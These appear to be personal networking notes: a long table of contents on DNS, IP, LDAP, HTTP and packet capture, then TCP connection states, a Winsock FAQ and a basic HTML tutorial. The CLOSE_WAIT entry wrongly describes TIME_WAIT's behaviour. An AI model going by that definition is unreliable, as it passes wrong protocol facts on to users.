  10.3.1.7. RESOLVER IMPLEMENTATION                                         43 <URL:#tn=  10.3.1.7. RESOLVER IMPLEMENTATION                                         43>
      10.3.1.7.1. Transforming a user request into a query                  43 <URL:#tn=      10.3.1.7.1. Transforming a user request into a query                  43>
      10.3.1.7.2. Sending the queries                                       44 <URL:#tn=      10.3.1.7.2. Sending the queries                                       44>
      10.3.1.7.3. Processing responses                                      46 <URL:#tn=      10.3.1.7.3. Processing responses                                      46>
      10.3.1.7.4. Using the cache                                           47 <URL:#tn=      10.3.1.7.4. Using the cache                                           47>
  10.3.1.8. MAIL SUPPORT                                                    47 <URL:#tn=  10.3.1.8. MAIL SUPPORT                                                    47>
      10.3.1.8.1. Mail exchange binding                                     48 <URL:#tn=      10.3.1.8.1. Mail exchange binding                                     48>
      10.3.1.8.2. Mailbox binding (Experimental)                            48 <URL:#tn=      10.3.1.8.2. Mailbox binding (Experimental)                            48>
  10.3.1.9. REFERENCES and BIBLIOGRAPHY                                     50 <URL:#tn=  10.3.1.9. REFERENCES and BIBLIOGRAPHY                                     50>
10.3.1.2. INTRODUCTION <URL:#tn=10.3.1.2. INTRODUCTION>
10.3.1.2.1. Overview <URL:#tn=10.3.1.2.1. Overview>
10.3.1.2.2. Common configurations <URL:#tn=10.3.1.2.2. Common configurations>
10.3.1.2.3. Conventions <URL:#tn=10.3.1.2.3. Conventions>
10.3.1.2.3.1. Preferred name syntax <URL:#tn=10.3.1.2.3.1. Preferred name syntax>
10.3.1.2.3.2. Data Transmission Order <URL:#tn=10.3.1.2.3.2. Data Transmission Order>
10.3.1.2.3.3. Character Case <URL:#tn=10.3.1.2.3.3. Character Case>
10.3.1.2.3.4. Size limits <URL:#tn=10.3.1.2.3.4. Size limits>
10.3.1.3. DOMAIN NAME SPACE AND RR DEFINITIONS <URL:#tn=10.3.1.3. DOMAIN NAME SPACE AND RR DEFINITIONS>
10.3.1.3.1. Name space definitions <URL:#tn=10.3.1.3.1. Name space definitions>
10.3.1.3.2. RR definitions <URL:#tn=10.3.1.3.2. RR definitions>
10.3.1.3.2.1. Format <URL:#tn=10.3.1.3.2.1. Format>
10.3.1.3.2.2. TYPE values <URL:#tn=10.3.1.3.2.2. TYPE values>
10.3.1.3.2.3. QTYPE values <URL:#tn=10.3.1.3.2.3. QTYPE values>
10.3.1.3.2.4. CLASS values <URL:#tn=10.3.1.3.2.4. CLASS values>
10.3.1.3.2.5. QCLASS values <URL:#tn=10.3.1.3.2.5. QCLASS values>
10.3.1.3.3. Standard RRs <URL:#tn=10.3.1.3.3. Standard RRs>
10.3.1.3.3.1. CNAME RDATA format <URL:#tn=10.3.1.3.3.1. CNAME RDATA format>
10.3.1.3.3.2. HINFO RDATA format <URL:#tn=10.3.1.3.3.2. HINFO RDATA format>
10.3.1.3.3.3. MB RDATA format (EXPERIMENTAL) <URL:#tn=10.3.1.3.3.3. MB RDATA format (EXPERIMENTAL)>
10.3.1.3.3.4. MD RDATA format (Obsolete) <URL:#tn=10.3.1.3.3.4. MD RDATA format (Obsolete)>
10.3.1.3.3.5. MF RDATA format (Obsolete) <URL:#tn=10.3.1.3.3.5. MF RDATA format (Obsolete)>
10.3.1.3.3.6. MG RDATA format (EXPERIMENTAL) <URL:#tn=10.3.1.3.3.6. MG RDATA format (EXPERIMENTAL)>
10.3.1.3.3.7. MINFO RDATA format (EXPERIMENTAL) <URL:#tn=10.3.1.3.3.7. MINFO RDATA format (EXPERIMENTAL)>
10.3.1.3.3.8. MR RDATA format (EXPERIMENTAL) <URL:#tn=10.3.1.3.3.8. MR RDATA format (EXPERIMENTAL)>
10.3.1.3.3.9. MX RDATA format <URL:#tn=10.3.1.3.3.9. MX RDATA format>
10.3.1.3.3.10. NULL RDATA format (EXPERIMENTAL) <URL:#tn=10.3.1.3.3.10. NULL RDATA format (EXPERIMENTAL)>
10.3.1.3.3.11. NS RDATA format <URL:#tn=10.3.1.3.3.11. NS RDATA format>
10.3.1.3.3.12. PTR RDATA format <URL:#tn=10.3.1.3.3.12. PTR RDATA format>
10.3.1.3.3.13. SOA RDATA format <URL:#tn=10.3.1.3.3.13. SOA RDATA format>
10.3.1.3.3.14. TXT RDATA format <URL:#tn=10.3.1.3.3.14. TXT RDATA format>
10.3.1.3.4. Internet specific RRs <URL:#tn=10.3.1.3.4. Internet specific RRs>
10.3.1.3.4.1. A RDATA format <URL:#tn=10.3.1.3.4.1. A RDATA format>
10.3.1.3.4.2. WKS RDATA format <URL:#tn=10.3.1.3.4.2. WKS RDATA format>
10.3.1.3.5. IN-ADDR.ARPA domain <URL:#tn=10.3.1.3.5. IN-ADDR.ARPA domain>
    10.IN-ADDR.ARPA.           PTR MILNET-GW.ISI.EDU. <URL:#tn=    10.IN-ADDR.ARPA.           PTR MILNET-GW.ISI.EDU.>
    10.IN-ADDR.ARPA.           PTR GW.LCS.MIT.EDU. <URL:#tn=    10.IN-ADDR.ARPA.           PTR GW.LCS.MIT.EDU.>
    6.0.0.10.IN-ADDR.ARPA.     PTR MULTICS.MIT.EDU. <URL:#tn=    6.0.0.10.IN-ADDR.ARPA.     PTR MULTICS.MIT.EDU.>
10.3.1.3.6. Defining new types, classes, and special namespaces <URL:#tn=10.3.1.3.6. Defining new types, classes, and special namespaces>
10.3.1.4. MESSAGES <URL:#tn=10.3.1.4. MESSAGES>
10.3.1.4.1. Format <URL:#tn=10.3.1.4.1. Format>
10.3.1.4.1.1. Header section format <URL:#tn=10.3.1.4.1.1. Header section format>
10.3.1.4.1.2. Question section format <URL:#tn=10.3.1.4.1.2. Question section format>
10.3.1.4.1.3. Resource record format <URL:#tn=10.3.1.4.1.3. Resource record format>
10.3.1.4.1.4. Message compression <URL:#tn=10.3.1.4.1.4. Message compression>
10.3.1.4.2. Transport <URL:#tn=10.3.1.4.2. Transport>
10.3.1.4.2.1. UDP usage <URL:#tn=10.3.1.4.2.1. UDP usage>
10.3.1.4.2.2. TCP usage <URL:#tn=10.3.1.4.2.2. TCP usage>
10.3.1.5. MASTER FILES <URL:#tn=10.3.1.5. MASTER FILES>
10.3.1.5.1. Format <URL:#tn=10.3.1.5.1. Format>
10.3.1.5.2. Use of master files to define zones <URL:#tn=10.3.1.5.2. Use of master files to define zones>
10.3.1.5.3. Master file example <URL:#tn=10.3.1.5.3. Master file example>
10.3.1.6. NAME SERVER IMPLEMENTATION <URL:#tn=10.3.1.6. NAME SERVER IMPLEMENTATION>
10.3.1.6.1. Architecture <URL:#tn=10.3.1.6.1. Architecture>
10.3.1.6.1.1. Control <URL:#tn=10.3.1.6.1.1. Control>
10.3.1.6.1.2. Database <URL:#tn=10.3.1.6.1.2. Database>
10.3.1.6.1.3. Time <URL:#tn=10.3.1.6.1.3. Time>
10.3.1.6.2. Standard query processing <URL:#tn=10.3.1.6.2. Standard query processing>
10.3.1.6.3. Zone refresh and reload processing <URL:#tn=10.3.1.6.3. Zone refresh and reload processing>
10.3.1.6.4. Inverse queries (Optional) <URL:#tn=10.3.1.6.4. Inverse queries (Optional)>
10.3.1.6.4.1. The contents of inverse queries and responses          Inverse <URL:#tn=10.3.1.6.4.1. The contents of inverse queries and responses          Inverse>
   1. zero, one, or multiple domain names for the specified <URL:#tn=   1. zero, one, or multiple domain names for the specified>
   2. an error code indicating that the name server doesn't support <URL:#tn=   2. an error code indicating that the name server doesn't support>
10.3.1.6.4.2. Inverse query and response example          The overall structure <URL:#tn=10.3.1.6.4.2. Inverse query and response example          The overall structure>
10.3.1.6.4.3. Inverse query processing <URL:#tn=10.3.1.6.4.3. Inverse query processing>
10.3.1.6.5. Completion queries and responses <URL:#tn=10.3.1.6.5. Completion queries and responses>
10.3.1.7. RESOLVER IMPLEMENTATION <URL:#tn=10.3.1.7. RESOLVER IMPLEMENTATION>
10.3.1.7.1. Transforming a user request into a query <URL:#tn=10.3.1.7.1. Transforming a user request into a query>
10.3.1.7.2. Sending the queries <URL:#tn=10.3.1.7.2. Sending the queries>
10.3.1.7.3. Processing responses <URL:#tn=10.3.1.7.3. Processing responses>
10.3.1.7.4. Using the cache <URL:#tn=10.3.1.7.4. Using the cache>
10.3.1.8. MAIL SUPPORT <URL:#tn=10.3.1.8. MAIL SUPPORT>
10.3.1.8.1. Mail exchange binding <URL:#tn=10.3.1.8.1. Mail exchange binding>
10.3.1.8.2. Mailbox binding (Experimental) <URL:#tn=10.3.1.8.2. Mailbox binding (Experimental)>
10.3.1.9. REFERENCES and BIBLIOGRAPHY <URL:#tn=10.3.1.9. REFERENCES and BIBLIOGRAPHY>
                10. <URL:#tn=                10.>
		10.3.2 <URL:#tn=		10.3.2>
	10.4 DNS tcp query timeout troubleshoot <URL:#tn=	10.4 DNS tcp query timeout troubleshoot>
		10.4.1 My examples <URL:#tn=		10.4.1 My examples>
		10.4.2 dig Command <URL:#tn=		10.4.2 dig Command>
		10.4.3 <URL:#tn=		10.4.3>
	10.5 Programming <URL:#tn=	10.5 Programming>
		10.5.1 The RES Library Set <URL:#tn=		10.5.1 The RES Library Set>
		10.5.2 res_mkquery(3) - Linux man page <URL:#tn=		10.5.2 res_mkquery(3) - Linux man page>
		10.5.3 C Programming with the Resolver Library Routines <URL:#tn=		10.5.3 C Programming with the Resolver Library Routines>
		10.5.4 res_init <URL:#tn=		10.5.4 res_init>
		10.5.5 List of DNS record types <URL:#tn=		10.5.5 List of DNS record types>
			10.5.5.1 Resource records [edit] <URL:#tn=			10.5.5.1 Resource records [edit]>
		10.5.6 res_mkquery()--Place Domain Query in Buffer <URL:#tn=		10.5.6 res_mkquery()--Place Domain Query in Buffer>
		10.5.7 nameser.h <URL:#tn=		10.5.7 nameser.h>
			10.5.7.1  old version <URL:#tn=			10.5.7.1  old version>
			10.5.7.2 new version <URL:#tn=			10.5.7.2 new version>
			10.5.7.3 <URL:#tn=			10.5.7.3>
		10.5.8 My code snippets <URL:#tn=		10.5.8 My code snippets>
			10.5.8.1  get list of nameservers from _res (loaded from resolv.conf) <URL:#tn=			10.5.8.1  get list of nameservers from _res (loaded from resolv.conf)>
			10.5.8.2 gethostbyname <URL:#tn=			10.5.8.2 gethostbyname>
			10.5.8.3 res_query A record <URL:#tn=			10.5.8.3 res_query A record>
			10.5.8.4 Getaddrinfo for resolv hostname to IP <URL:#tn=			10.5.8.4 Getaddrinfo for resolv hostname to IP>
				10.5.8.4.1 Simple <URL:#tn=				10.5.8.4.1 Simple>
				10.5.8.4.2 Customized <URL:#tn=				10.5.8.4.2 Customized>
				10.5.8.4.3 <URL:#tn=				10.5.8.4.3>
			10.5.8.5 <URL:#tn=			10.5.8.5>
		10.5.9 nslookup & dig sources <URL:#tn=		10.5.9 nslookup & dig sources>
			10.5.9.1 http://www.isc.org/index.pl?/sw/bind/bind9.php <URL:#tn=			10.5.9.1 http://www.isc.org/index.pl?/sw/bind/bind9.php>
			10.5.9.2 <URL:#tn=			10.5.9.2>
		10.5.10 libresolv_query.c <URL:#tn=		10.5.10 libresolv_query.c>
		10.5.11 <URL:#tn=		10.5.11>
	10.6 DNS FAQ <URL:#tn=	10.6 DNS FAQ>
		10.6.1 lookup domain controller srv record <URL:#tn=		10.6.1 lookup domain controller srv record>
		10.6.2 How do I find the authoritative name-server for a domain name? <URL:#tn=		10.6.2 How do I find the authoritative name-server for a domain name?>
		10.6.3 Find AD DC SRV records of given site <URL:#tn=		10.6.3 Find AD DC SRV records of given site>
		10.6.4 <URL:#tn=		10.6.4>
	10.7 Linux admin <URL:#tn=	10.7 Linux admin>
		10.7.1  nscd - name service cache daemon <URL:#tn=		10.7.1  nscd - name service cache daemon>
			10.7.1.1  restart <URL:#tn=			10.7.1.1  restart>
			10.7.1.2 <URL:#tn=			10.7.1.2>
	10.8 <URL:#tn=	10.8>
11. List of TCP and UDP port numbers <URL:#tn=11. List of TCP and UDP port numbers>
	11.1 From Wikipedia <URL:#tn=	11.1 From Wikipedia>
	11.2 <URL:#tn=	11.2>
12. IP <URL:#tn=12. IP>
	12.1 IPv4 <URL:#tn=	12.1 IPv4>
		12.1.1 Internet Protocol IPv4 <URL:#tn=		12.1.1 Internet Protocol IPv4>
			12.1.1.1 INTRODUCTION <URL:#tn=			12.1.1.1 INTRODUCTION>
				12.1.1.1.1 Introduction to Internet Protocol <URL:#tn=				12.1.1.1.1 Introduction to Internet Protocol>
					12.1.1.1.1.1 What is 'Internet Protocol' ? <URL:#tn=					12.1.1.1.1.1 What is 'Internet Protocol' ?>
					12.1.1.1.1.2 What is an 'IP Network'? <URL:#tn=					12.1.1.1.1.2 What is an 'IP Network'?>
					12.1.1.1.1.3 What is an 'IP Host'? <URL:#tn=					12.1.1.1.1.3 What is an 'IP Host'?>
					12.1.1.1.1.4 What is an IP address? <URL:#tn=					12.1.1.1.1.4 What is an IP address?>
					12.1.1.1.1.5 <URL:#tn=					12.1.1.1.1.5>
				12.1.1.1.2 IP Addresses <URL:#tn=				12.1.1.1.2 IP Addresses>
					12.1.1.1.2.1 Internet Protocol Addresses (IP Addresses) <URL:#tn=					12.1.1.1.2.1 Internet Protocol Addresses (IP Addresses)>
				12.1.1.1.3 IP Address Exhaustion <URL:#tn=				12.1.1.1.3 IP Address Exhaustion>
					12.1.1.1.3.1 Public IPv4 Addresses <URL:#tn=					12.1.1.1.3.1 Public IPv4 Addresses>
					12.1.1.1.3.2 Classful IPv4 Addressing <URL:#tn=					12.1.1.1.3.2 Classful IPv4 Addressing>
					12.1.1.1.3.3 Classless IPv4 Addressing <URL:#tn=					12.1.1.1.3.3 Classless IPv4 Addressing>
					12.1.1.1.3.4 Variable Length Subnet Masking <URL:#tn=					12.1.1.1.3.4 Variable Length Subnet Masking>
					12.1.1.1.3.5 <URL:#tn=					12.1.1.1.3.5>
				12.1.1.1.4 IP Routing <URL:#tn=				12.1.1.1.4 IP Routing>
					12.1.1.1.4.1 DEFINITIONS AND TERMS <URL:#tn=					12.1.1.1.4.1 DEFINITIONS AND TERMS>
						12.1.1.1.4.1.1  Route <URL:#tn=						12.1.1.1.4.1.1  Route>
       						12.1.1.1.4.1.2  Router <URL:#tn=       						12.1.1.1.4.1.2  Router>
       						12.1.1.1.4.1.3  Routing Protocol <URL:#tn=       						12.1.1.1.4.1.3  Routing Protocol>
       						12.1.1.1.4.1.4  Routing vs. Routed <URL:#tn=       						12.1.1.1.4.1.4  Routing vs. Routed>
       						12.1.1.1.4.1.5  Metrics <URL:#tn=       						12.1.1.1.4.1.5  Metrics>
       						12.1.1.1.4.1.6  Convergence <URL:#tn=       						12.1.1.1.4.1.6  Convergence>
       						12.1.1.1.4.1.7  Static vs. Dynamic <URL:#tn=       						12.1.1.1.4.1.7  Static vs. Dynamic>
       						12.1.1.1.4.1.8  Single vs. Multipath <URL:#tn=       						12.1.1.1.4.1.8  Single vs. Multipath>
       						12.1.1.1.4.1.9  Interior vs. Exterior Gateway Protocols <URL:#tn=       						12.1.1.1.4.1.9  Interior vs. Exterior Gateway Protocols>
       						12.1.1.1.4.1.10 Flat vs. Hierarchichal <URL:#tn=       						12.1.1.1.4.1.10 Flat vs. Hierarchichal>
       						12.1.1.1.4.1.11 Distance Vector vs. Link State Protocols <URL:#tn=       						12.1.1.1.4.1.11 Distance Vector vs. Link State Protocols>
       						12.1.1.1.4.1.12 Source Routing <URL:#tn=       						12.1.1.1.4.1.12 Source Routing>
       						12.1.1.1.4.1.13 Default Gateways <URL:#tn=       						12.1.1.1.4.1.13 Default Gateways>
       						12.1.1.1.4.1.14 Classless Inter Domain Routing (CIDR) <URL:#tn=       						12.1.1.1.4.1.14 Classless Inter Domain Routing (CIDR)>
       						12.1.1.1.4.1.15 CIDR Notation <URL:#tn=       						12.1.1.1.4.1.15 CIDR Notation>
					12.1.1.1.4.2 THE ROUTING PROTOCOLS <URL:#tn=					12.1.1.1.4.2 THE ROUTING PROTOCOLS>
						12.1.1.1.4.2.1 Routing Information Protocol (RIP) <URL:#tn=						12.1.1.1.4.2.1 Routing Information Protocol (RIP)>
						12.1.1.1.4.2.2 Intermediate System to Intermediate System (IS-IS) <URL:#tn=						12.1.1.1.4.2.2 Intermediate System to Intermediate System (IS-IS)>
						12.1.1.1.4.2.3 Open Shortest Path First (OSPF) <URL:#tn=						12.1.1.1.4.2.3 Open Shortest Path First (OSPF)>
						12.1.1.1.4.2.4 Interior Gateway Routing Protocol (IGRP) <URL:#tn=						12.1.1.1.4.2.4 Interior Gateway Routing Protocol (IGRP)>
						12.1.1.1.4.2.5 Enhanced Interior Gateway Routing Protocol (EIGRP) <URL:#tn=						12.1.1.1.4.2.5 Enhanced Interior Gateway Routing Protocol (EIGRP)>
						12.1.1.1.4.2.6 Border Gateway Protocol (BGP) <URL:#tn=						12.1.1.1.4.2.6 Border Gateway Protocol (BGP)>
				12.1.1.1.5 IP Communication <URL:#tn=				12.1.1.1.5 IP Communication>
					12.1.1.1.5.1 Datagram Structure / Packet Format / Bit Map <URL:#tn=					12.1.1.1.5.1 Datagram Structure / Packet Format / Bit Map>
					12.1.1.1.5.2 Unicast vs. Broadcast <URL:#tn=					12.1.1.1.5.2 Unicast vs. Broadcast>
					12.1.1.1.5.3 Multicast <URL:#tn=					12.1.1.1.5.3 Multicast>
				12.1.1.1.6 <URL:#tn=				12.1.1.1.6>
			12.1.1.2 <URL:#tn=			12.1.1.2>
		12.1.2 <URL:#tn=		12.1.2>
	12.2 IPv6 <URL:#tn=	12.2 IPv6>
13. LDAP <URL:#tn=13. LDAP>
	13.1  LDAP query syntax <URL:#tn=	13.1  LDAP query syntax>
		13.1.1   My examples <URL:#tn=		13.1.1   My examples>
			13.1.1.1    search user <URL:#tn=			13.1.1.1    search user>
		13.1.2 <URL:#tn=		13.1.2>
	13.2 <URL:#tn=	13.2>
14. tcpdump <URL:#tn=14. tcpdump>
	14.1  View traffic <URL:#tn=	14.1  View traffic>
		14.1.1  View LDAP traffic <URL:#tn=		14.1.1  View LDAP traffic>
		14.1.2 <URL:#tn=		14.1.2>
	14.2 <URL:#tn=	14.2>
15. wireshark <URL:#tn=15. wireshark>
	15.1 filters <URL:#tn=	15.1 filters>
		15.1.1 CLDAP Ping <URL:#tn=		15.1.1 CLDAP Ping>
			15.1.1.1 What is it? <URL:#tn=			15.1.1.1 What is it?>
			15.1.1.2 Filter <URL:#tn=			15.1.1.2 Filter>
			15.1.1.3 example <URL:#tn=			15.1.1.3 example>
			15.1.1.4 <URL:#tn=			15.1.1.4>
		15.1.2 <URL:#tn=		15.1.2>
	15.2 wireshark mac <URL:#tn=	15.2 wireshark mac>
	    15.2.1 install <URL:#tn=	    15.2.1 install>
	    15.2.2 <URL:#tn=	    15.2.2>
	15.3 <URL:#tn=	15.3>
16. Active-Directory <URL:#tn=16. Active-Directory>
	16.1  CLDAP, LDAP Ping, AD Ping <URL:#tn=	16.1  CLDAP, LDAP Ping, AD Ping>
		16.1.1   Determine Client Site in wireshark <URL:#tn=		16.1.1   Determine Client Site in wireshark>
		16.1.2 <URL:#tn=		16.1.2>
	16.2 <URL:#tn=	16.2>
17.  HTTP Client tools <URL:#tn=17.  HTTP Client tools>
    17.1  Postman <URL:#tn=    17.1  Postman>
    17.2 gemini ## Free Alternatives to Postman <URL:#tn=    17.2 gemini ## Free Alternatives to Postman>
    17.3 HTTPie <URL:#tn=    17.3 HTTPie>
        17.3.1  Installing and Using HTTPie <URL:#tn=        17.3.1  Installing and Using HTTPie>
        17.3.2 Saving and Reusing Requests in HTTPie <URL:#tn=        17.3.2 Saving and Reusing Requests in HTTPie>
        17.3.3 <URL:#tn=        17.3.3>
    17.4 <URL:#tn=    17.4>
18. odata <URL:#tn=18. odata>
    18.1  Intro <URL:#tn=    18.1  Intro>
    18.2 https://www.odata.org/getting-started/understand-odata-in-6-steps/ <URL:#tn=    18.2 https://www.odata.org/getting-started/understand-odata-in-6-steps/>
        18.2.1 step 1, request all resources <URL:#tn=        18.2.1 step 1, request all resources>
        18.2.2 step 2 , Requesting an individual resource <URL:#tn=        18.2.2 step 2 , Requesting an individual resource>
        18.2.3 step 3 <URL:#tn=        18.2.3 step 3>
    18.3 <URL:#tn=    18.3>
19. HTTP tags: http <URL:#tn=19. HTTP tags: http>
    19.1 HTTP Protocol <URL:#tn=    19.1 HTTP Protocol>
        19.1.1 https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview <URL:#tn=        19.1.1 https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview>
            19.1.1.1 Introduction <URL:#tn=            19.1.1.1 Introduction>
            19.1.1.2 Client server chain <URL:#tn=            19.1.1.2 Client server chain>
            19.1.1.3 Client: the user-agent <URL:#tn=            19.1.1.3 Client: the user-agent>
            19.1.1.4 The Web server <URL:#tn=            19.1.1.4 The Web server>
            19.1.1.5 Proxies <URL:#tn=            19.1.1.5 Proxies>
            19.1.1.6 Basic aspects of HTTP <URL:#tn=            19.1.1.6 Basic aspects of HTTP>
                19.1.1.6.1 HTTP is simple <URL:#tn=                19.1.1.6.1 HTTP is simple>
                19.1.1.6.2 HTTP is extensible <URL:#tn=                19.1.1.6.2 HTTP is extensible>
                19.1.1.6.3 HTTP is stateless, but not sessionless <URL:#tn=                19.1.1.6.3 HTTP is stateless, but not sessionless>
                19.1.1.6.4 HTTP and connections <URL:#tn=                19.1.1.6.4 HTTP and connections>
                19.1.1.6.5 What can be controlled by HTTP <URL:#tn=                19.1.1.6.5 What can be controlled by HTTP>
                19.1.1.6.6 HTTP flow <URL:#tn=                19.1.1.6.6 HTTP flow>
                19.1.1.6.7 HTTP Messages <URL:#tn=                19.1.1.6.7 HTTP Messages>
                    19.1.1.6.7.1 Requests <URL:#tn=                    19.1.1.6.7.1 Requests>
                    19.1.1.6.7.2 Responses <URL:#tn=                    19.1.1.6.7.2 Responses>
                19.1.1.6.8 APIs based on HTTP <URL:#tn=                19.1.1.6.8 APIs based on HTTP>
            19.1.1.7 Conclusion <URL:#tn=            19.1.1.7 Conclusion>
            19.1.1.8 <URL:#tn=            19.1.1.8>
        19.1.2 <URL:#tn=        19.1.2>
    19.2 HTTP/2 <URL:#tn=    19.2 HTTP/2>
        19.2.1 https://www.upwork.com/resources/what-is-http2 <URL:#tn=        19.2.1 https://www.upwork.com/resources/what-is-http2>
            19.2.1.1 primary goals of HTTP2 <URL:#tn=            19.2.1.1 primary goals of HTTP2>
            19.2.1.2 HTTP/1.1 vs. HTTP/2: Main differences <URL:#tn=            19.2.1.2 HTTP/1.1 vs. HTTP/2: Main differences>
            19.2.1.3 <URL:#tn=            19.2.1.3>
        19.2.2 RFC https://datatracker.ietf.org/doc/html/rfc7540 <URL:#tn=        19.2.2 RFC https://datatracker.ietf.org/doc/html/rfc7540>
        19.2.3 <URL:#tn=        19.2.3>
    19.3 <URL:#tn=    19.3>
20. <URL:#tn=20.>
.................................................END TOC..............................................





























1. TCP 
	1.1 TCP states


States of a TCP connection. These can be seen with netstat -at

CLOSED
A theoretical state where a TCP connection doesnt exist yet.
LISTEN
A state where TCP connection is waiting for a connection to be made to it.
SYN_RCVD
A SYN has been received, a SYN ACK has been sent, and we are waiting for an ACK.
SYN_SENT
A SYN has been sent to start a connection, the SYN ACK hasnt yet been received.
ESTABLISHED
A connection has been established
CLOSE_WAIT
After a TCP connection has been closed, the spec says you should make sure that the connection is not reopened for a few minutes to prevent packets that were delayed in the Internet causing the connection to be reopened. These will disappear by themselves after a while. This can cause problems on servers that have lots of very short connections (such as a web server) by filling up the OSs connection table. See also EADDRINUSE
LAST_ACK
A FIN has been received, weve sent our own FIN, but we are waiting on the ACK before we can move to the closed state.
FIN_WAIT_1
A FIN has been sent, waiting for a ACK or FIN
FIN_WAIT_2
A FIN has been sent, and an ACK has been received. More data can be received. This connection is half open.
CLOSING
A FIN has been sent, and one received, the FIN hasnt been ACKed yet.
TIME_WAIT
The connection has closed, and is waiting for 2MSL

Tuning your systems settings

The amount of time that a connection waits in various stages is controlled by the OperatingSystem. Some OSes let you tune these settings. For example, for Linux-based OSes, look at the control files in /proc/sys/net/ipv4. According to /usr/src/linux/Documentation/filesystems/proc.txt:

tcp_syn_retries
Number of times initial SYNs for a TCP connection attempt will be retransmitted. Should not be higher than 255. This is only the timeout for outgoing connections, for incoming connections the number of retransmits is defined by tcp_retries1.
tcp_fin_timeout
The length of time in seconds it takes to receive a final FIN before the socket is always closed. This is strictly a violation of the TCP specification, but required to prevent denial-of-service attacks.
tcp_retries1
Defines how often an answer to a TCP connection request is retransmitted before giving up.
tcp_retries2
Defines how often a TCP packet is retransmitted before giving up.

	1.2 Winsock FAQ
# Problem: From the default CLOSED state, how does a client program normally get to the ESTABLISHED state?

Solution: The client calls the connect() function (or similar), which causes TCP to send an empty packet with the SYN control bit set (SYN_SENT). The remote peer's stack sees this "synchronize" request, and sends back an empty packet with the SYN and ACK bits set (i.e. "I acknowledge your synchronize request"). When the client receives the SYN/ACK packet, it sends back an ACK packet, and reports a successful connection to the client program.

# Problem: What is the normal TCP shutdown sequence?

Solution: The important thing to understand is that TCP is a bidirectional protocol. So, the connection is shut down in two identical stages, one for each "direction". One peer sends a packet with the FIN bit set, which the other end ACKnowledges; when the other end is also finished sending data, it sends out a FIN packet, which the other end ACKs, closing the connection.

# Problem: What is the significance of the RST bit?

Solution: This is an abnormal close, also called "slamming the connection shut." It happens under several circumstances, but none of the common ones are documented in the Stevens diagram. Two of these cases you can cause from Winsock: the first method is to set SO_LINGER to 0 with setsockopt() and then call closesocket(). The second method is to call shutdown() with how equal to 2, optionally followed by a closesocket() call.

From the Winsock client level, the two other common RST occurrences are "connection refused" and "remote peer terminated connection." The first happens when you try to connect to a port that isn't open on a remote machine. The second happens as a result of the remote peer using one of the two RST-forcing methods above; alternately, the application could have crashed, and the peer's stack sent out a RST for its connection. Another way this can happen is the remote peer catastrophically crashed, and then after the remote machine came back up, your program sent it a packet which the stack rightfully had no way of delivering, so it replied with a RST packet, because the connection's 5-tuple is now invalid.

Generally speaking, RST signals a problem of some kind: either something bad happened to the connection, or there's a bug somewhere. For example, some firewalls improperly use the RST bit to signal a closed connection. The solution, of course, is to replace the firewall product. :)

# Problem: Netstat shows lots of sockets in the TIME_WAIT state. What's wrong?

Solution: Nothing's wrong. TIME_WAIT is absolutely normal. If you go through the state-transition diagram above, you see that every socket that gets closed normally goes through this state after it's closed. The TIME_WAIT state is a safety mechanism, to catch stray packets for that connection after the connection is "officially" closed. Since the maximum time that such stray packets can exist is 2 times the "maximum segment lifetime" (the time for a packet to go from your machine to the remote peer and for the response to come back), the TIME_WAIT state lasts for 2 * MSL. The only tricky bit is, there is no easy way to estimate MSL on the fly, so stacks traditionally hard-code a value for it, from 15 to 60 seconds. Thus, TIME_WAIT usually lasts 30-120 seconds.

# Problem: My sockets keep getting into a FIN_WAIT_x state. What's wrong?

Solution: Either your program or the remote peer is not closing the socket properly. If you walk through the state-transition diagram above, you can see that FIN_WAIT_1 usually happens when the local program calls shutdown() with the "how" parameter set to 1 or SD_SEND, but the remote peer doesn't respond. Likewise FIN_WAIT_2 happens when the remote peer shuts down its sending half of the connection, and your program doesn't respond. Since FIN_WAIT states often last up to 10 minutes, it's well worth the effort to fix the problem that's causing these FIN_WAIT states. (The exact length of the state depends on the stack and the circumstances that got it into that state.)

# Problem: Often my calls to bind() fail when I try to re-bind to a port that I was just using. What's wrong?

Solution: The socket is probably in one of the FIN_WAIT states or in the TIME_WAIT state. If it's a FIN_WAIT problem and you can't fix it, or if it's the normal TIME_WAIT state, the best thing to do is to redesign your program so that it doesn't need to keep re-binding. For example, a server program generally keeps its listener socket alive so that it doesn't have to keep re-binding it to the port; if you closesocket() the listener for some reason after each successful connection, your listener socket will go into the TIME_WAIT state for somewhere between 30 and 120 seconds, during which you won't be able to re-bind to that port. However, if you find that re-binding is absolutely necessary, setting the SOREUSEADDR option with setsockopt() will usually get you around the problem.

2. HTML

	2.1 HTML Tutorial
http://www.w3schools.com/HTML/

	    	2.1.1 Basic

	    	    	2.1.1.1 Introduction
Type in the following text:

<html>
<head>
<title>Title of page</title>
</head>
<body>
This is my first homepage. <b>This text is bold</b>
</body>
</html>

Save the file as "mypage.htm". 

Start your Internet browser. Select "Open" (or "Open Page") in the File menu of your browser. A dialog box will appear. Select "Browse" (or "Choose File") and locate the HTML file you just created - "mypage.htm" - select it and click "Open". Now you should see an address in the dialog box, for example "C:\MyDocuments\mypage.htm". Click OK, and the browser will display the page.
Example Explained

The first tag in your HTML document is <html>. This tag tells your browser that this is the start of an HTML document. The last tag in your document is </html>. This tag tells your browser that this is the end of the HTML document.

The text between the <head> tag and the </head> tag is header information. Header information is not displayed in the browser window.

The text between the <title> tags is the title of your document. The title is displayed in your browser's caption.

The text between the <body> tags is the text that will be displayed in your browser.

The text between the <b> and </b> tags will be displayed in a bold font.
HTM or HTML Extension?

When you save an HTML file, you can use either the .htm or the .html extension. We have used .htm in our examples. It might be a bad habit inherited from the past when some of the commonly used software only allowed three letter extensions.

With newer software we think it will be perfectly safe to use .html.
Note on HTML Editors:

You can easily edit HTML files using a WYSIWYG (what you see is what you get) editor like FrontPage or Dreamweaver, instead of writing your markup tags in a plain text file.

However, if you want to be a skillful Web developer, we strongly recommend that you use a plain text editor to learn your primer HTML.
Frequently Asked Questions

Q: After I have edited an HTML file, I cannot view the result in my browser. Why?
A: Make sure that you have saved the file with a proper name and extension like "c:\mypage.htm". Also make sure that you use the same name when you open the file in your browser.

Q: I have edited an HTML file, but the changes don't show in the browser. Why?
A: A browser caches pages so it doesn't have to read the same page twice. When you have modified a page, the browser doesn't know that. Use the browser's refresh/reload button to force the browser to reload the page.

Q: What browser should I use?
A: You can do all the training with all of the well-known browsers, like Internet Explorer, Firefox, Netscape, or Opera. However, some of the examples in our advanced classes require the latest versions of the browsers.

Q: Does my computer have to run Windows? What about a Mac?
A: You can do all your training on a non-Windows computer like a Mac.

